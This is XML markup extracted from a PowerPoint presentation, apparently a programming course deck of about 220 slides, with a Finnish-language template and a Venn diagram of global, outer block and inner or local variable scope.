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38" r:id="rId4"/>
    <p:sldId id="259" r:id="rId5"/>
    <p:sldId id="260" r:id="rId6"/>
    <p:sldId id="257" r:id="rId7"/>
    <p:sldId id="261" r:id="rId8"/>
    <p:sldId id="262" r:id="rId9"/>
    <p:sldId id="310" r:id="rId10"/>
    <p:sldId id="335" r:id="rId11"/>
    <p:sldId id="275" r:id="rId12"/>
    <p:sldId id="276" r:id="rId13"/>
    <p:sldId id="337" r:id="rId14"/>
    <p:sldId id="294" r:id="rId15"/>
    <p:sldId id="286" r:id="rId16"/>
    <p:sldId id="459" r:id="rId17"/>
    <p:sldId id="287" r:id="rId18"/>
    <p:sldId id="427" r:id="rId19"/>
    <p:sldId id="263" r:id="rId20"/>
    <p:sldId id="340" r:id="rId21"/>
    <p:sldId id="300" r:id="rId22"/>
    <p:sldId id="457" r:id="rId23"/>
    <p:sldId id="271" r:id="rId24"/>
    <p:sldId id="272" r:id="rId25"/>
    <p:sldId id="302" r:id="rId26"/>
    <p:sldId id="273" r:id="rId27"/>
    <p:sldId id="336" r:id="rId28"/>
    <p:sldId id="274" r:id="rId29"/>
    <p:sldId id="341" r:id="rId30"/>
    <p:sldId id="343" r:id="rId31"/>
    <p:sldId id="301" r:id="rId32"/>
    <p:sldId id="318" r:id="rId33"/>
    <p:sldId id="317" r:id="rId34"/>
    <p:sldId id="461" r:id="rId35"/>
    <p:sldId id="319" r:id="rId36"/>
    <p:sldId id="312" r:id="rId37"/>
    <p:sldId id="303" r:id="rId38"/>
    <p:sldId id="290" r:id="rId39"/>
    <p:sldId id="285" r:id="rId40"/>
    <p:sldId id="293" r:id="rId41"/>
    <p:sldId id="346" r:id="rId42"/>
    <p:sldId id="345" r:id="rId43"/>
    <p:sldId id="326" r:id="rId44"/>
    <p:sldId id="348" r:id="rId45"/>
    <p:sldId id="324" r:id="rId46"/>
    <p:sldId id="325" r:id="rId47"/>
    <p:sldId id="462" r:id="rId48"/>
    <p:sldId id="463" r:id="rId49"/>
    <p:sldId id="464" r:id="rId50"/>
    <p:sldId id="305" r:id="rId51"/>
    <p:sldId id="304" r:id="rId52"/>
    <p:sldId id="264" r:id="rId53"/>
    <p:sldId id="342" r:id="rId54"/>
    <p:sldId id="277" r:id="rId55"/>
    <p:sldId id="269" r:id="rId56"/>
    <p:sldId id="288" r:id="rId57"/>
    <p:sldId id="265" r:id="rId58"/>
    <p:sldId id="266" r:id="rId59"/>
    <p:sldId id="267" r:id="rId60"/>
    <p:sldId id="323" r:id="rId61"/>
    <p:sldId id="268" r:id="rId62"/>
    <p:sldId id="344" r:id="rId63"/>
    <p:sldId id="280" r:id="rId64"/>
    <p:sldId id="307" r:id="rId65"/>
    <p:sldId id="465" r:id="rId66"/>
    <p:sldId id="311" r:id="rId67"/>
    <p:sldId id="281" r:id="rId68"/>
    <p:sldId id="350" r:id="rId69"/>
    <p:sldId id="351" r:id="rId70"/>
    <p:sldId id="352" r:id="rId71"/>
    <p:sldId id="492" r:id="rId72"/>
    <p:sldId id="493" r:id="rId73"/>
    <p:sldId id="349" r:id="rId74"/>
    <p:sldId id="347" r:id="rId75"/>
    <p:sldId id="439" r:id="rId76"/>
    <p:sldId id="440" r:id="rId77"/>
    <p:sldId id="472" r:id="rId78"/>
    <p:sldId id="467" r:id="rId79"/>
    <p:sldId id="291" r:id="rId80"/>
    <p:sldId id="353" r:id="rId81"/>
    <p:sldId id="466" r:id="rId82"/>
    <p:sldId id="354" r:id="rId83"/>
    <p:sldId id="468" r:id="rId84"/>
    <p:sldId id="469" r:id="rId85"/>
    <p:sldId id="470" r:id="rId86"/>
    <p:sldId id="471" r:id="rId87"/>
    <p:sldId id="423" r:id="rId88"/>
    <p:sldId id="446" r:id="rId89"/>
    <p:sldId id="447" r:id="rId90"/>
    <p:sldId id="473" r:id="rId91"/>
    <p:sldId id="327" r:id="rId92"/>
    <p:sldId id="355" r:id="rId93"/>
    <p:sldId id="478" r:id="rId94"/>
    <p:sldId id="328" r:id="rId95"/>
    <p:sldId id="477" r:id="rId96"/>
    <p:sldId id="357" r:id="rId97"/>
    <p:sldId id="356" r:id="rId98"/>
    <p:sldId id="358" r:id="rId99"/>
    <p:sldId id="474" r:id="rId100"/>
    <p:sldId id="359" r:id="rId101"/>
    <p:sldId id="360" r:id="rId102"/>
    <p:sldId id="361" r:id="rId103"/>
    <p:sldId id="372" r:id="rId104"/>
    <p:sldId id="373" r:id="rId105"/>
    <p:sldId id="441" r:id="rId106"/>
    <p:sldId id="442" r:id="rId107"/>
    <p:sldId id="480" r:id="rId108"/>
    <p:sldId id="475" r:id="rId109"/>
    <p:sldId id="458" r:id="rId110"/>
    <p:sldId id="460" r:id="rId111"/>
    <p:sldId id="476" r:id="rId112"/>
    <p:sldId id="479" r:id="rId113"/>
    <p:sldId id="270" r:id="rId114"/>
    <p:sldId id="278" r:id="rId115"/>
    <p:sldId id="289" r:id="rId116"/>
    <p:sldId id="481" r:id="rId117"/>
    <p:sldId id="482" r:id="rId118"/>
    <p:sldId id="484" r:id="rId119"/>
    <p:sldId id="485" r:id="rId120"/>
    <p:sldId id="483" r:id="rId121"/>
    <p:sldId id="487" r:id="rId122"/>
    <p:sldId id="488" r:id="rId123"/>
    <p:sldId id="489" r:id="rId124"/>
    <p:sldId id="490" r:id="rId125"/>
    <p:sldId id="362" r:id="rId126"/>
    <p:sldId id="363" r:id="rId127"/>
    <p:sldId id="369" r:id="rId128"/>
    <p:sldId id="364" r:id="rId129"/>
    <p:sldId id="491" r:id="rId130"/>
    <p:sldId id="365" r:id="rId131"/>
    <p:sldId id="366" r:id="rId132"/>
    <p:sldId id="368" r:id="rId133"/>
    <p:sldId id="367" r:id="rId134"/>
    <p:sldId id="370" r:id="rId135"/>
    <p:sldId id="371" r:id="rId136"/>
    <p:sldId id="309" r:id="rId137"/>
    <p:sldId id="282" r:id="rId138"/>
    <p:sldId id="298" r:id="rId139"/>
    <p:sldId id="334" r:id="rId140"/>
    <p:sldId id="299" r:id="rId141"/>
    <p:sldId id="316" r:id="rId142"/>
    <p:sldId id="308" r:id="rId143"/>
    <p:sldId id="332" r:id="rId144"/>
    <p:sldId id="333" r:id="rId145"/>
    <p:sldId id="430" r:id="rId146"/>
    <p:sldId id="306" r:id="rId147"/>
    <p:sldId id="292" r:id="rId148"/>
    <p:sldId id="283" r:id="rId149"/>
    <p:sldId id="295" r:id="rId150"/>
    <p:sldId id="284" r:id="rId151"/>
    <p:sldId id="314" r:id="rId152"/>
    <p:sldId id="315" r:id="rId153"/>
    <p:sldId id="320" r:id="rId154"/>
    <p:sldId id="321" r:id="rId155"/>
    <p:sldId id="322" r:id="rId156"/>
    <p:sldId id="329" r:id="rId157"/>
    <p:sldId id="428" r:id="rId158"/>
    <p:sldId id="429" r:id="rId159"/>
    <p:sldId id="279" r:id="rId160"/>
    <p:sldId id="443" r:id="rId161"/>
    <p:sldId id="444" r:id="rId162"/>
    <p:sldId id="331" r:id="rId163"/>
    <p:sldId id="375" r:id="rId164"/>
    <p:sldId id="376" r:id="rId165"/>
    <p:sldId id="377" r:id="rId166"/>
    <p:sldId id="378" r:id="rId167"/>
    <p:sldId id="379" r:id="rId168"/>
    <p:sldId id="380" r:id="rId169"/>
    <p:sldId id="382" r:id="rId170"/>
    <p:sldId id="383" r:id="rId171"/>
    <p:sldId id="384" r:id="rId172"/>
    <p:sldId id="426" r:id="rId173"/>
    <p:sldId id="385" r:id="rId174"/>
    <p:sldId id="408" r:id="rId175"/>
    <p:sldId id="386" r:id="rId176"/>
    <p:sldId id="387" r:id="rId177"/>
    <p:sldId id="388" r:id="rId178"/>
    <p:sldId id="390" r:id="rId179"/>
    <p:sldId id="381" r:id="rId180"/>
    <p:sldId id="389" r:id="rId181"/>
    <p:sldId id="392" r:id="rId182"/>
    <p:sldId id="394" r:id="rId183"/>
    <p:sldId id="395" r:id="rId184"/>
    <p:sldId id="396" r:id="rId185"/>
    <p:sldId id="397" r:id="rId186"/>
    <p:sldId id="398" r:id="rId187"/>
    <p:sldId id="399" r:id="rId188"/>
    <p:sldId id="400" r:id="rId189"/>
    <p:sldId id="401" r:id="rId190"/>
    <p:sldId id="402" r:id="rId191"/>
    <p:sldId id="403" r:id="rId192"/>
    <p:sldId id="404" r:id="rId193"/>
    <p:sldId id="425" r:id="rId194"/>
    <p:sldId id="445" r:id="rId195"/>
    <p:sldId id="405" r:id="rId196"/>
    <p:sldId id="406" r:id="rId197"/>
    <p:sldId id="407" r:id="rId198"/>
    <p:sldId id="410" r:id="rId199"/>
    <p:sldId id="411" r:id="rId200"/>
    <p:sldId id="413" r:id="rId201"/>
    <p:sldId id="414" r:id="rId202"/>
    <p:sldId id="415" r:id="rId203"/>
    <p:sldId id="416" r:id="rId204"/>
    <p:sldId id="417" r:id="rId205"/>
    <p:sldId id="418" r:id="rId206"/>
    <p:sldId id="419" r:id="rId207"/>
    <p:sldId id="424" r:id="rId208"/>
    <p:sldId id="420" r:id="rId209"/>
    <p:sldId id="422" r:id="rId210"/>
    <p:sldId id="433" r:id="rId211"/>
    <p:sldId id="437" r:id="rId212"/>
    <p:sldId id="448" r:id="rId213"/>
    <p:sldId id="449" r:id="rId214"/>
    <p:sldId id="451" r:id="rId215"/>
    <p:sldId id="452" r:id="rId216"/>
    <p:sldId id="453" r:id="rId217"/>
    <p:sldId id="454" r:id="rId218"/>
    <p:sldId id="455" r:id="rId219"/>
    <p:sldId id="434" r:id="rId220"/>
    <p:sldId id="438" r:id="rId221"/>
  </p:sldIdLst>
  <p:sldSz cx="12192000" cy="6858000"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:defaultTextStyle>
    <a:defPPr>
      <a:defRPr lang="fi-FI"/>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Normaali tyyli 2 - Korostu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Normaali tyyli 1 - Korostu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535" autoAdjust="0"/>
    <p:restoredTop sz="94660"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr>
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="245" d="100"/>
          <a:sy n="245" d="100"/>
        </p:scale>
        <p:origin x="324" y="192"/>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1697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FC3EF0-D77B-4DB6-8117-1AD03E0E246F}" type="doc">
      <dgm:prSet loTypeId="urn:microsoft.com/office/officeart/2005/8/layout/venn2" loCatId="relationship" qsTypeId="urn:microsoft.com/office/officeart/2005/8/quickstyle/simple5" qsCatId="simple" csTypeId="urn:microsoft.com/office/officeart/2005/8/colors/accent1_2" csCatId="accent1" phldr="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fi-FI"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F2261AA7-402E-49A6-97F2-4BF12B7BA49C}">
      <dgm:prSet phldrT="[Teksti]"/>
      <dgm:spPr>
        <a:solidFill>
          <a:srgbClr val="FF0000"/>
        </a:solidFill>
      </dgm:spPr>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" noProof="0" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:rPr>
            <a:t>Global Scope</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C243D20F-E868-488B-8A47-13E76B146AF1}" type="parTrans" cxnId="{4F741A94-859A-42DA-8FAE-3D929A42B28F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fi-FI"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{44BD9349-A33D-4D5F-B786-AFD851DDA1E8}" type="sibTrans" cxnId="{4F741A94-859A-42DA-8FAE-3D929A42B28F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fi-FI"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{17F59ED6-4217-4EA6-9098-3768046EA1D9}">
      <dgm:prSet phldrT="[Teksti]"/>
      <dgm:spPr>
        <a:solidFill>
          <a:srgbClr val="FFC000"/>
        </a:solidFill>
      </dgm:spPr>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" noProof="0" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:rPr>
            <a:t>Outer Block Scope</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F7013C87-C5D5-423D-A19C-E57E2F7FDC4A}" type="parTrans" cxnId="{0AD141F6-8D30-4789-94F6-0B0BCB81A2D6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fi-FI"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2F7B09F5-B10A-46A6-B8FA-DBDCB62972DB}" type="sibTrans" cxnId="{0AD141F6-8D30-4789-94F6-0B0BCB81A2D6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fi-FI"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{82B5E7AF-5ADE-4CC1-8E04-19E255242CE8}">
      <dgm:prSet phldrT="[Teksti]"/>
      <dgm:spPr>
        <a:solidFill>
          <a:srgbClr val="FFFF00"/>
        </a:solidFill>
      </dgm:spPr>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" noProof="0" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:rPr>
            <a:t>Inner or Local Scope</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7A5220F3-CDE8-406D-89D5-4F20AF580FF6}" type="parTrans" cxnId="{03ECF845-58D2-4022-B6F4-0B6A923A4748}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fi-FI"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7D88A1D3-85A9-4242-BDF7-98E4AB75BEA5}" type="sibTrans" cxnId="{03ECF845-58D2-4022-B6F4-0B6A923A4748}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fi-FI"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FFDAD878-07D8-46ED-A87F-0C1597816D7C}" type="pres">
      <dgm:prSet presAssocID="{B7FC3EF0-D77B-4DB6-8117-1AD03E0E246F}" presName="Name0" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:chMax val="7"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{DAB5D9AD-1B06-462F-A0A6-6C4289603DE8}" type="pres">
      <dgm:prSet presAssocID="{B7FC3EF0-D77B-4DB6-8117-1AD03E0E246F}" presName="comp1" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{658E44EF-9451-4E7C-8B4C-CB406CA93849}" type="pres">
      <dgm:prSet presAssocID="{B7FC3EF0-D77B-4DB6-8117-1AD03E0E246F}" presName="circle1" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{2CD02279-2BA5-48AA-9A41-A3DB6AA504CB}" type="pres">
      <dgm:prSet presAssocID="{B7FC3EF0-D77B-4DB6-8117-1AD03E0E246F}" presName="c1text" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{35793861-5AB0-4F68-B09E-625FF8086C66}" type="pres">
      <dgm:prSet presAssocID="{B7FC3EF0-D77B-4DB6-8117-1AD03E0E246F}" presName="comp2" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{3944DDC9-7AC5-4F59-AE18-6F89C514CEDE}" type="pres">
      <dgm:prSet presAssocID="{B7FC3EF0-D77B-4DB6-8117-1AD03E0E246F}" presName="circle2" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{3E6C49A3-A98C-4DB0-9FF8-12D9C6BE0CD5}" type="pres">
      <dgm:prSet presAssocID="{B7FC3EF0-D77B-4DB6-8117-1AD03E0E246F}" presName="c2text" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{37213BEB-8D95-4880-9D0F-0D94C7600A76}" type="pres">
      <dgm:prSet presAssocID="{B7FC3EF0-D77B-4DB6-8117-1AD03E0E246F}" presName="comp3" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{015A5823-3D46-49E9-8EB8-F3E113C8D392}" type="pres">
      <dgm:prSet presAssocID="{B7FC3EF0-D77B-4DB6-8117-1AD03E0E246F}" presName="circle3" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{DDF84FDF-4C77-41B0-B1C6-DCEF1BCE0C46}" type="pres">
      <dgm:prSet presAssocID="{B7FC3EF0-D77B-4DB6-8117-1AD03E0E246F}" presName="c3text" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{2D74F908-F41B-4D41-A4C2-F8E8C4567472}" type="presOf" srcId="{B7FC3EF0-D77B-4DB6-8117-1AD03E0E246F}" destId="{FFDAD878-07D8-46ED-A87F-0C1597816D7C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/venn2"/>
    <dgm:cxn modelId="{861CB31A-F837-473A-ABAA-44487D2B2CB4}" type="presOf" srcId="{17F59ED6-4217-4EA6-9098-3768046EA1D9}" destId="{3944DDC9-7AC5-4F59-AE18-6F89C514CEDE}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/venn2"/>
    <dgm:cxn modelId="{D3AC2828-4987-4077-9412-78FC75CA98E9}" type="presOf" srcId="{17F59ED6-4217-4EA6-9098-3768046EA1D9}" destId="{3E6C49A3-A98C-4DB0-9FF8-12D9C6BE0CD5}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/venn2"/>
    <dgm:cxn modelId="{07EF9C2C-4438-45E7-AA01-8B765211FAB1}" type="presOf" srcId="{82B5E7AF-5ADE-4CC1-8E04-19E255242CE8}" destId="{015A5823-3D46-49E9-8EB8-F3E113C8D392}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/venn2"/>
    <dgm:cxn modelId="{03ECF845-58D2-4022-B6F4-0B6A923A4748}" srcId="{B7FC3EF0-D77B-4DB6-8117-1AD03E0E246F}" destId="{82B5E7AF-5ADE-4CC1-8E04-19E255242CE8}" srcOrd="2" destOrd="0" parTransId="{7A5220F3-CDE8-406D-89D5-4F20AF580FF6}" sibTransId="{7D88A1D3-85A9-4242-BDF7-98E4AB75BEA5}"/>
    <dgm:cxn modelId="{511A9D49-DA2D-47DA-AF08-BD6DF3400532}" type="presOf" srcId="{F2261AA7-402E-49A6-97F2-4BF12B7BA49C}" destId="{658E44EF-9451-4E7C-8B4C-CB406CA93849}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/venn2"/>
    <dgm:cxn modelId="{12D5F15A-EC67-43DA-8035-81FC94F1A9A8}" type="presOf" srcId="{F2261AA7-402E-49A6-97F2-4BF12B7BA49C}" destId="{2CD02279-2BA5-48AA-9A41-A3DB6AA504CB}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/venn2"/>
    <dgm:cxn modelId="{4F741A94-859A-42DA-8FAE-3D929A42B28F}" srcId="{B7FC3EF0-D77B-4DB6-8117-1AD03E0E246F}" destId="{F2261AA7-402E-49A6-97F2-4BF12B7BA49C}" srcOrd="0" destOrd="0" parTransId="{C243D20F-E868-488B-8A47-13E76B146AF1}" sibTransId="{44BD9349-A33D-4D5F-B786-AFD851DDA1E8}"/>
    <dgm:cxn modelId="{DBB80DA0-FA03-4421-A853-67310E9130C9}" type="presOf" srcId="{82B5E7AF-5ADE-4CC1-8E04-19E255242CE8}" destId="{DDF84FDF-4C77-41B0-B1C6-DCEF1BCE0C46}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/venn2"/>
    <dgm:cxn modelId="{0AD141F6-8D30-4789-94F6-0B0BCB81A2D6}" srcId="{B7FC3EF0-D77B-4DB6-8117-1AD03E0E246F}" destId="{17F59ED6-4217-4EA6-9098-3768046EA1D9}" srcOrd="1" destOrd="0" parTransId="{F7013C87-C5D5-423D-A19C-E57E2F7FDC4A}" sibTransId="{2F7B09F5-B10A-46A6-B8FA-DBDCB62972DB}"/>
    <dgm:cxn modelId="{C69E0AA8-5966-4457-9D36-45639A6D4D9B}" type="presParOf" srcId="{FFDAD878-07D8-46ED-A87F-0C1597816D7C}" destId="{DAB5D9AD-1B06-462F-A0A6-6C4289603DE8}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/venn2"/>
    <dgm:cxn modelId="{08AFB947-E666-487D-A89B-C90CA377CC5E}" type="presParOf" srcId="{DAB5D9AD-1B06-462F-A0A6-6C4289603DE8}" destId="{658E44EF-9451-4E7C-8B4C-CB406CA93849}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/venn2"/>
    <dgm:cxn modelId="{E7EC6F24-B193-4849-BAA1-0695232B557E}" type="presParOf" srcId="{DAB5D9AD-1B06-462F-A0A6-6C4289603DE8}" destId="{2CD02279-2BA5-48AA-9A41-A3DB6AA504CB}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/venn2"/>
    <dgm:cxn modelId="{DEBD8861-D804-454F-B490-066C5D05CC8C}" type="presParOf" srcId="{FFDAD878-07D8-46ED-A87F-0C1597816D7C}" destId="{35793861-5AB0-4F68-B09E-625FF8086C66}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/venn2"/>
    <dgm:cxn modelId="{83C4AACD-301D-4A33-8152-7D368C73CD5B}" type="presParOf" srcId="{35793861-5AB0-4F68-B09E-625FF8086C66}" destId="{3944DDC9-7AC5-4F59-AE18-6F89C514CEDE}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/venn2"/>
    <dgm:cxn modelId="{9D4C4F9F-FE46-4FBF-9216-67D4CBBCE482}" type="presParOf" srcId="{35793861-5AB0-4F68-B09E-625FF8086C66}" destId="{3E6C49A3-A98C-4DB0-9FF8-12D9C6BE0CD5}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/venn2"/>
    <dgm:cxn modelId="{171D08FE-A6B0-4509-8F41-F92B276FBEB7}" type="presParOf" srcId="{FFDAD878-07D8-46ED-A87F-0C1597816D7C}" destId="{37213BEB-8D95-4880-9D0F-0D94C7600A76}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/venn2"/>
    <dgm:cxn modelId="{104D489C-C5E1-4A9E-BA46-FFB977F999AE}" type="presParOf" srcId="{37213BEB-8D95-4880-9D0F-0D94C7600A76}" destId="{015A5823-3D46-49E9-8EB8-F3E113C8D392}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/venn2"/>
    <dgm:cxn modelId="{BB0511D5-DC5E-45C6-831C-D585A4DDC89B}" type="presParOf" srcId="{37213BEB-8D95-4880-9D0F-0D94C7600A76}" destId="{DDF84FDF-4C77-41B0-B1C6-DCEF1BCE0C46}"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E44EF-9451-4E7C-8B4C-CB406CA93849}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="429418" y="0"/>
          <a:ext cx="4525963" cy="4525963"/>
        </a:xfrm>
        <a:prstGeom prst="ellipse">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:srgbClr val="FF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noProof="0" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:rPr>
            <a:t>Global Scope</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1901487" y="226298"/>
        <a:ext cx="1581824" cy="678894"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{3944DDC9-7AC5-4F59-AE18-6F89C514CEDE}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="995163" y="1131490"/>
          <a:ext cx="3394472" cy="3394472"/>
        </a:xfrm>
        <a:prstGeom prst="ellipse">
          <a:avLst/>
        </a:pr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noProof="0" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:rPr>
            <a:t>Outer Block Scope</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1901487" y="1343645"/>
        <a:ext cx="1581824" cy="636463"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{015A5823-3D46-49E9-8EB8-F3E113C8D392}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1560909" y="2262981"/>
          <a:ext cx="2262981" cy="2262981"/>
        </a:xfrm>
        <a:prstGeom prst="ellipse">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:srgbClr val="FFFF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noProof="0" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:rPr>
            <a:t>Inner or Local Scope</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1892315" y="2828726"/>
        <a:ext cx="1600169" cy="1131490"/>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914400" y="2130426"/>
            <a:ext cx="10363200" cy="1470025"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI"/>
              <a:t>Muokkaa perustyyl. napsautt.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Alaotsikk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Muokkaa alaotsikon perustyyliä napsautt.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Päivämäärän paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ACE75394-DA1B-465F-B507-95BC1324D218}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{7B96D8AA-C1FB-4102-8DD0-75CAB9C5DFFC}" type="datetimeFigureOut">
              <a:rPr lang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>20.9.2021</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Alatunnisteen paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1CACC6B-B66F-4D36-84DE-E4D0B7BC3940}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
